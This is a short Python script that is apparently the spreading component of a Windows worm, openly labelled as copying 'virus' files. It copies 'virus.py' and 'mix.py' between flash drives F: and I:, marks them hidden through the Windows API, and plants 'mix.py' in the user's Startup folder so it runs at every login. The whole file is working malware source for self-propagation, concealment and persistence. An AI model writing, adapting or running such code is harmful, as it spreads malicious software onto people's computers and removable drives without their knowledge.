import shutil
import ctypes
import time
import os

user = os.getlogin()
timer = 0
while True:
    time.sleep(3)
    pwd = os.getcwd()
    if pwd == 'F:\\': #1
        timer +=1
        try:
            cp_virus = shutil.copy('virus.py','i:')# it's for copy virus to flash
            cp_mix = shutil.copy('mix.py','i:') #it's for copy mix to flash
            print('run 1')
        except:
            print('error 1')
            pass
        ctypes.windll.kernel32.SetFileAttributesW('i:mix.py',2) # it's for select the permision (hidden)
        ctypes.windll.kernel32.SetFileAttributesW('i:virus.py',2)
        print('hidden execute')
    elif pwd == 'I:\\':   #2
        timer +=2
        try:
            cp_virus = shutil.copy('virus.py','f:')
            cp_mix = shutil.copy('mix.py','f:')
            cp_mix2 = shutil.copy('mix.py','C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\'% user)
            print('run 2')
        except:
            print('error 2')
            pass

     #3   
    elif pwd == 'C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'% user :
        try:
            #cp_virus = shutil.copy('virus.py','i:')# it's for copy virus to flash
            cp_mix = shutil.copy('mix.py','i:') #it's for copy mix to flash
            print('run 3')
        except:
            print('error 3')
            pass

    else:
        print('error x400')
        print('...>> ',timer)
